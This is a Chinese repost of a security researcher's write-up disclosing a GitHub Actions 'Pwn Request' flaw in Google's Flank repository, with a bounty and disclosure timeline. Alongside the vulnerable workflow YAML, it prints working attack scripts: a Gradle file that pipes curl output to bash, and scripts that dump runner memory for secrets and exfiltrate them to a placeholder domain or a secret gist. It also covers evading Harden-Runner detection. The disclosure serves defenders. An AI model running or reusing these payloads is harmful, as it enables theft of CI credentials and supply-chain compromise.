#  Google Flank 中的一个模糊操作工作流程漏洞   
 Ots安全   2024-04-18 18:07  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWjGV070yFQTH7haEPwI8kbO7zeHAwk8O4QdeVKiartlu0W1nHtaGgcOhaHoSugdF4iaU3peCmvOiasFA/640?wx_fmt=gif "")  
  
**整文大致介绍**  
  
这篇文章主要介绍了作者在Google的Flank存储库中发现的一种名为“Pwn Request”的漏洞。Flank是Google的一个官方开源项目，被描述为“Firebase Test Lab的大规模并行Android和iOS测试运行器”。  
  
  
该漏洞使得任何拥有GitHub账户的人都可以窃取Google服务账户凭据，这些凭据被用作存储库密钥，并且获取了具有写入权限的GITHUB_TOKEN。  
  
  
Google的VRP因此报告奖励了作者7500美元的漏洞赏金，因为这被视为“标准OSS项目”级别下的软件供应链妥协。  
  
  
尽管Actions Injections和Pwn Request漏洞并不新鲜，而且利用它们的过程也不值得写成博客，但是这个特定漏洞有一些独特之处，值得强调。  
  
  
作者使用了一个自动化工具来发现这个漏洞。该工具名为Gato-X，它是作者在之前的雇主Praetorian开发的一个工具的改进版。作者在旁边做着bug赏金猎人的工作，使用正则表达式发现注入和Pwn请求漏洞。作者开始为这种漏洞类别添加检测，并将其添加到工具的私有分支中。  
  
  
Gato-X通过扫描运行在风险触发器上的工作流程，然后从中识别真实的阳性案例，来实现在规模上识别这些问题的可能性。  
  
  
作者发现了Flank存储库中的漏洞，并提供了一些有关漏洞发现、POC和披露时间表的详细信息。他还讨论了该漏洞的特点以及他用于证明漏洞的一些技术细节。  
  
  
最后，作者还分享了一个名为Harden-Runner的防御产品，该产品可以检测到工作流程中的异常事件，尽管作者成功地利用了漏洞，但这个防御产品对于GitHub Actions工作流程的安全性仍然很有帮助。  
  
一、介绍  
  
最近，我报告了 Google 的 Flank 存储库中的“Pwn Request”漏洞。Flank 被描述为“Firebase 测试实验室的大规模并行 Android 和 iOS 测试运行器”，是 Google 官方开源项目。  
  
该漏洞允许拥有 GitHub 帐户的任何人窃取 Google 服务帐户凭据，这些凭据被用作存储库机密，并获得对GITHUB_TOKEN具有写入权限的访问权限。  
  
Google 的 VRP 针对这份报告向我奖励了 7,500 美元的错误赏金，作为“标准 OSS 项目”层下的软件供应链妥协。  
  
操作注入和 Pwn 请求漏洞远非新鲜事，目前利用它们并不值得在博客文章中讨论，但我认为这个特定漏洞有一些独特的方面值得强调。  
  
该存储库的独特之处在于，尽管谷歌运营着业内最好的错误赏金计划之一，但它仍然容易受到攻击。大多数“教科书”Pwn 请求将在几天内被错误赏金猎人报告；然而，该漏洞是在2020 年 12 月 17 日在此 Pull 请求中引入的。这意味着三年多来，尽管很有可能获得慷慨的错误赏金，但没有人发现此漏洞！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexnzictf4LQ51vt1O6y5BAzGch0k52alX1YOjaUZtgBPvxVYbTAxasM2dibdHdGSlVAwm4xyH6dfSw/640?wx_fmt=png&from=appmsg "")  
  
该漏洞允许拥有 GitHub 帐户的任何人窃取 Google 服务帐户凭据，这些凭据被用作存储库机密，并获得对GITHUB_TOKEN具有写入权限的访问权限。  
  
Google 的 VRP 针对这份报告向我奖励了 7,500 美元的错误赏金，作为“标准 OSS 项目”层下的软件供应链妥协。  
  
操作注入和 Pwn 请求漏洞远非新鲜事，目前利用它们并不值得在博客文章中讨论，但我认为这个特定漏洞有一些独特的方面值得强调。  
  
该存储库的独特之处在于，尽管谷歌运营着业内最好的错误赏金计划之一，但它仍然容易受到攻击。大多数“教科书”Pwn 请求将在几天内被错误赏金猎人报告；然而，该漏洞是在2020 年 12 月 17 日在此 Pull 请求中引入的。这意味着三年多来，尽管很有可能获得慷慨的错误赏金，但没有人发现此漏洞！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexnzictf4LQ51vt1O6y5BAzczAfOwcUdB6ibSc73iaB2To4HRhfPWnhBaicKTjdVojVvb0m3tyUWAMCw/640?wx_fmt=png&from=appmsg "")  
  
  
我是怎么找到它的？我使用了自己开发的自动化工具来发现此漏洞。在这篇文章中，我将介绍我是如何发现它的、我的 PoC、披露时间表，并提供一些关于我认为如何大规模解决该 bug 类的智慧之言。  
  
  
二、发现与概念验证  
  
1. Gato-X  
  
在我之前的雇主 Praetorian 工作期间，我领导了一款名为Gato的工具的开发。该工具专注于自托管运行程序以及 GitHub 经典个人访问令牌的泄露后枚举和利用。  
  
与此同时，我一直在利用正则表达式进行 bug 赏金狩猎，以发现注入和 pwn 请求漏洞。我总有一种感觉，我错过了一些不起眼的案例，我是对的。  
  
我开始致力于添加对注入和 Pwn 请求攻击的检测，并将其添加到我的工具的私有分支中。已经有针对此类漏洞的工具，例如 Cycode Labs 的 Raven 和TinderSec 的 gh-workflow-auditor，但是我采取了不同的设计方法，从进攻的角度解决问题。  
  
我的目标不是尝试审核工作流程或生成可操作的发现，而是大规模扫描在风险触发器上运行的工作流程，然后从中逆向工作以识别真正的积极因素：  
- 一次获取 20 或 30,000 个存储库，并确定候选存储库以供进一步审查。我为此使用了 sourcegraph.com/search 。  
  
- 误报是可以的，但可以提供上下文以在几秒钟内快速确定某些内容是否有趣。  
  
- 尽可能避免漏报。  
  
目前，该工具将采用 20-30,000 个存储库并报告大约 2000 个候选者。在该工具的当前状态下，大约 70% 是误报。然而，对于大多数误报，我只需查看结果就可以辨别出来。最好的部分？Gato-X 在具有单个 GitHub 帐户的笔记本电脑上运行，仅需几个小时即可执行此扫描。  
  
下面是 Gato-X 为 Flank 提供的输出。我立刻就可以断定：  
- 工作流程继续运行issue_comment（其中包括对拉取请求的评论）  
  
- 它在称为“Checkout Pull Request”的运行步骤中通过上下文表达式引用了拉取请求编号  
  
仅仅看到这个输出，我就知道它值得研究。Gato-X 还提供了指向 HTML 工作流程的直接链接，因此我可以单击它并进一步调查。  
```
    "pwn_request_risk": [],
    "injection_risk": [
        {
            "workflow_name": "run_integration_tests.yml",
            "workflow_url": "https://github.com/Flank/flank/blob/master/.github/workflows/run_integration_tests.yml",
            "details": {
                "triggers": [
                    "issue_comment"
                ],
                "should_run_it": {
                    "Check if integrations tests should run": {
                        "variables": [
                            "env.run_it",
                            "steps.check_issue_comment.outputs.triggered == 'true'"
                        ]
                    }
                },
                "run-it-full-suite": {
                    "Checkout Pull Request": {
                        "variables": [
                            "needs.should_run_it.outputs.pr_number"
                        ],
                        "if_checks": "github.event_name == 'issue_comment'"
                    },
                    "if_check": "needs.should_run_it.outputs.run_integration_tests == 'true'"
                },
                "process-results": {
                    "Process IT results": {
                        "variables": [
                            "needs.run-it-full-suite.outputs.job_status"
                        ]
                    },
                    "if_check": "always() && github.event_name != 'issue_comment'"
                }
            }
        }
    ]
},
```  
  
您可能会注意到，当 Gato-X 获取存储库时，它没有将其检测为 Pwn 请求，因为该pwn_request_risk字段为空。这是因为当时，Gato-X 没有通过 cli 检查 PR 的特定检测gh，但围绕 r 使用的上下文pr_numbe足以确定该存储库值得调查。  
  
  
2. 代码审查  
  
该漏洞的独特之处可能也是之前没有人发现它的原因。该工作流在 上运行issue_comment，但实际上并未引用通常在操作注入漏洞的资源中调用的上下文变量。  
  
首先，工作流程检索拉取请求的 HTML URL。接下来，它从 HTML URL 中解析出 PR 号。最后，它将其设置为该步骤的输出值。  
```
- name: Get PR number
     id: pr_number
     if: ${{ github.event_name == 'issue_comment'}}
     run: |
       PR_URL="${{ github.event.issue.pull_request.url }}"
       PR_NUMBER=${PR_URL##*/}
       echo "number=$PR_NUMBER" >> $GITHUB_OUTPUT
```  
  
后续步骤使用上一步输出中的 PR 编号，并通过上下文表达式将其传递到包含 的运行步骤gh pr checkout。  
```
- name: Checkout Pull Request
    if: github.event_name == 'issue_comment'
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    run: |
      gh pr checkout ${{ needs.should_run_it.outputs.pr_number }}

```  
  
这凸显了在检查 GitHub Actions 工作流程中是否存在漏洞时，从源到汇分析的重要性。  
  
签出后，工作流程最终运行了集成测试，我可以对其进行修改，以证明我可以在特权工作流程的上下文中执行任意代码。  
  
  
2.1 Gato-X – 即将推出！  
  
我希望尽快开源 Gato-X 的 alpha 版本。我当前的目标是通过从每个 if 检查构建表达式树并在触发事件的外部参与者的上下文中对其进行评估来降低误报率。  
  
我迫不及待地想发布它，因为该工具的速度和发现晦涩案例的结合使安全专业人员能够以前所未有的规模在数小时内识别这些问题。  
  
  
3. 概念验证  
  
为了证明此漏洞，美国东部时间 2 月 27 日 10:45，我使用有效负载创建了草稿拉取请求，并能够证明该漏洞以及对应用程序令牌秘密的访问。  
  
我想对 Boost Security 的 Living off the Pipeline 项目表示赞赏。我能够使用Gradle 的现成负载作为我的代码注入点。像 LoTP 这样的项目使安全研究人员更容易证明漏洞，但也为开发人员提供了一份文件列表，他们应该小心，以确保如果工作流在有风险的触发器上运行，外部参与者无法修改。  
  
您可以在下面看到工作流程如何访问机密，然后使用grade/grade-build-action.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexnzictf4LQ51vt1O6y5BAzq0l3Lru3IQyMfDrtjRc2avlHOsGPZxQv8JfF3ia7A30U978eblNfojQ/640?wx_fmt=png&from=appmsg "")  
  
我修改了settings.gradle.kts我的 fork 中的文件，以从文件中提取代码并将其通过管道传输到 bash。  
```
// For VRP Test, not malicious.
fun String.runCommand(): String? = try {
    ProcessBuilder("/bin/sh", "-c", this)
        .redirectOutput(ProcessBuilder.Redirect.PIPE)
        .redirectError(ProcessBuilder.Redirect.PIPE)
        .start()
        .inputStream.bufferedReader().readText()
} catch (e: Exception) {
    e.printStackTrace()
    null
}
 
val output = "curl -sSfL https://github.com/Flank/flank/raw/88e5a56dd3ed78f4f192eadf31634c013dbbf060/README | bash".runCommand()
println("Shell command output: $output")
```  
  
该有效负载使我能够获得对GITHUB_TOKEN具有写入权限和应用程序机密的访问权限。准备好有效负载后，我创建了一个拉取请求草案并发表了评论@flank-it。这触发了分支上下文中工作流的执行main。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexnzictf4LQ51vt1O6y5BAzrjntBiakdwoNS7sgVMB4ODdJCCQxlWC3Ut3MtibDdDib5aEHuEPeb0CwQ/640?wx_fmt=png&from=appmsg "")  
  
不久之后，我收到了要点形式的秘密。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexnzictf4LQ51vt1O6y5BAzW7oibRSf7p7bAd1EmicfMiapFDX2yhGgVLljiacZhQPDdqBia7xXRSls5hw/640?wx_fmt=png&from=appmsg "")  
  
4. Harden-Runner 检测  
  
如果您查看我的有效负载，您可能会注意到我正在从名为 README 的基本存储库下载原始文件。通常，我只是将以下有效负载托管在 Gist 中并将其通过管道传输到 Bash，如下所示：  
```
# Replace with Burp collaborator domain or similar.
YOUR_EXFIL="your-exfil-domain.com"
 
# Uses memory dump technique from github.com/nikitastupin/pwnhub / with regex to parse out all secret values (including GITHUB_TOKEN)
if [[ "$OSTYPE" == "linux-gnu" ]]; then
  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0`
  # Exfil to Burp
  curl -s -d "$B64_BLOB" https://$YOUR_EXFIL/token > /dev/null
else
  exit 0
fi
```  
  
对于 Flank，我在这里运用了一些创造力，因为我注意到工作流程在审核模式下使用 StepSecurity 的Harden-Runner 。由于哈登跑步者更多地接受审计，因此我不必偷偷摸摸地证明该漏洞，但我想看看是否可以绕过检测作为练习。  
  
  
4.1 在分叉网络中提交  
  
我向我的 fork 提交了两个文件。第一个是 Bash 脚本，另一个是 Nikita Stupin 出色的内存转储脚本的副本，我在过去几个月中广泛使用了该脚本。  
  
在 GitHub 中，分叉中的任何提交也在基本存储库中。这意味着您可以从分叉存储库或基础访问相同的提交哈希。这就是为什么我的有效负载引用了基础存储库中的文件。  
```
val output = "curl -sSfL https://github.com/Flank/flank/raw/88e5a56dd3ed78f4f192eadf31634c013dbbf060/README | bash".runCommand()
println("Shell command output: $output")
```  
  
  
4.2 将数据外泄到秘密Gist  
  
由于 Harden Runner 会接收对异常 URL 的请求，因此我没有简单地将编码的 blob 泄露到 Burp，而是使用 GitHub API 以及细粒度的 PAT（我在 PoC 后很快撤销了该 PAT）来将 GCloud 应用程序令牌和 GITHUB_TOKEN 上传到一个秘密要点。  
```
if [[ "$OSTYPE" == "linux-gnu" ]]; then
  B64_BLOB=`curl -sSfL https://github.com/flank/flank/raw/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0`
  YEETER_TOKEN="<EXFIL TOKEN>"
  YEETER_TOKEN_DECODED=`echo $YEETER_TOKEN | base64 -d | base64 -d`
 
  curl -L \
    -X POST \
    -H "Accept: application/vnd.github+json" \
    -H "Authorization: Bearer $YEETER_TOKEN_DECODED" \
    -H "X-GitHub-Api-Version: 2022-11-28" \
    https://api.github.com/gists -d '{"public":false,"files":{"Spoils":{"content":"'$B64_BLOB'"}}}'
 
    sleep 900
else
  exit 0
fi
```  
  
这种渗透方法对于利用操作漏洞非常有用，因为所有流量都流向 GitHub。它对于自托管运行程序更为有用，其中运行程序所处的环境可能具有强大的出口控制。  
  
  
4.3 有效吗？  
  
事实上，Harden-Runner 在我的 PoC 期间确实检测到了一个异常请求，这令人印象深刻。我原以为使用来自基础存储库的提交会掩盖该行为，但问题是，在该工作流程中对自身的调用是异常的，如见解页面raw.githubusercontent所示。如果处于块模式，它会阻止有效负载的初始下载，我将不得不争先恐后地更新它以使用不同的方法，或者只是在拉取请求中硬编码完整的有效负载。harden-runner  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexnzictf4LQ51vt1O6y5BAzD3tcSaZZiaBOzuXc3xyUoFNITJ8ibh2H818fK7FHCrpiciaDOLYUawPfhg/640?wx_fmt=png&from=appmsg "")  
  
这个很重要！在现实世界的供应链攻击场景中，对攻击者的第一次利用尝试发出警报可以让安全团队注意到，因此即使攻击者重新利用并成功捕获应用程序令牌，安全团队也可以通过撤销机密和信息来遏制攻击者。在评估违规行为时暂时禁用操作。供应链攻击的独特之处在于它们通常是延迟熔断攻击，如果安全团队能够在攻击者行为中捕获攻击者，那么攻击者不太可能造成任何长期损害。  
  
事后看来，我应该使用 GitHub 的 API 下载提交，从 JSON 响应中解析内容 Base64 blob，然后将其通过管道传输到 Bash，这样就可以避免异常事件。我本可以更进一步使用 Java 来完成此操作，因为这样目标和 URL 都会与基线匹配。  
  
没有任何防御产品可以阻止每一个渗漏或攻击媒介，但 Harden Runner 作为 GitHub Actions 工作流程的安全解决方案给我留下了深刻的印象。  
  
现在，如果攻击者通过 Pwn 请求或对上游依赖项的供应链攻击，甚至操作缓存中毒来进入工作流程执行（请继续关注 - 我很快就会有更多相关内容），那么就不会出现“没有任何东西可以检测或阻止他们。  
  
  
三、披露时间表  
- 2024 年 2 月 27 日– 报告发送至 Google VRP  
  
- 2024 年 2 月 28 日– 报告已接受  
  
- 2024 年 3 月 5 日– 获得 7,500 美元赏金  
  
- 2024 年 3 月 11 日– Google 在https://github.com/Flank/flank/pull/2482中修复了工作流程  
  
- 2024 年 4 月 3 日– 通知 Google 计划于 4 月中旬发布博文并共享草稿。收到消息说我很乐意发表。  
  
- 2024 年 4 月 15 日– 博客发布。  
  
- 与往常一样，我在向 Google VRP 报告此错误时获得了非常好的体验。  
  
原文地址：  
```
https://adnanthekhan.com/2024/04/15/an-obscure-actions-workflow-vulnerability-in-googles-flank/#exfiltrate-to-secret-gist
```  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
